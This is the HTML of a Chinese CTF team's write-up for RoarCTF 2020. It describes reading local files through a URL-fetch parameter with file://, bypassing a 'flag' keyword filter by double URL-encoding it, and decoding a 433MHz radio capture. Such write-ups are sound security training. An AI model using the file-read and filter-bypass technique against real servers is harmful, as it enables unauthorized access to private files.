<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>RoarCTF 2020 | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/5.175964b3.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>RoarCTF 2020</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2020-roarctf.html#签到题" class="sidebar-link">签到题</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-roarctf.html#hi-433mhz" class="sidebar-link">Hi_433MHz</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-roarctf.html#fm" class="sidebar-link">FM</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-roarctf.html#你能登录成功吗" class="sidebar-link">你能登录成功吗</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-roarctf.html#你能登录成功吗-revenge" class="sidebar-link">你能登录成功吗-Revenge</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-roarctf.html#html在线代码编辑器" class="sidebar-link">HTML在线代码编辑器</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2020-roarctf.html#crypto-system" class="sidebar-link">Crypto_System</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="roarctf-2020"><a href="#roarctf-2020" class="header-anchor">#</a> RoarCTF 2020</h1> <p>两个一血，张师傅tql</p> <h2 id="签到题"><a href="#签到题" class="header-anchor">#</a> 签到题</h2> <p>打开页面啥也没有，以为题目又没加载出来。查看源码得到<code>/?url=</code>提示，尝试传入一个url，结果回显了对应页面的源码，推测这里有类似<code>file_get_contents</code>的操作。</p> <p><img src="/assets/img/roarctf2020_signin_1.598681f6.png" alt=""></p> <p><img src="/assets/img/roarctf2020_signin_2.221dae14.png" alt=""></p> <p>尝试<code>file://</code>协议读本地文件，成功，可以读到网页源码，发现对<code>flag</code>做了简单过滤。</p> <p><img src="/assets/img/roarctf2020_signin_3.22d471d3.png" alt=""></p> <p><img src="/assets/img/roarctf2020_signin_4.1039b989.png" alt=""></p> <p>URL编码双写绕过之，得到flag。</p> <p><img src="/assets/img/roarctf2020_signin_5.e13e8156.png" alt=""></p> <p>flag：<code>flag{ccf9f0dd01b0d5ab49058e519351b6aa}</code></p> <h2 id="hi-433mhz"><a href="#hi-433mhz" class="header-anchor">#</a> Hi_433MHz</h2> <p>得到的文件内容完全没有规律和肉眼可见的结构。简单的查阅资料得知，harkrf保存的信号数据不包含任何元数据，且数据的二进制结构由扩展名标注。本题文件的扩展名为<code>.s8</code>，代表有符号8位整数。使用audacity的Import Raw Data功能，使用上述信息导入数据（采样率未知，保持默认）：</p> <p><img src="/assets/img/roarctf2020_433_1.a6d514e7.png" alt=""></p> <p>放大一个“波峰”，可以看到数据使用信号的有无及持续时间而非强度进行编码，类似莫尔斯电码，但是每组信号的总长度固定：</p> <p><img src="/assets/img/roarctf2020_433_2.93d744e6.png" alt=""></p> <p>怀疑每一组信号代表flag中的一个字符，尝试将前几足信号与flag的首字符（<code>flag{</code>，0x66、0x6c……）进行对应，发现编码方式：连续的信号代表1、连续的无信号代表0，短的信号脉冲用于每位间的分割，每组信号编码一个字符的8位ASCII码。按信号波形读出二进制数据，解码得到flag：</p> <p><img src="data:image/png;base64,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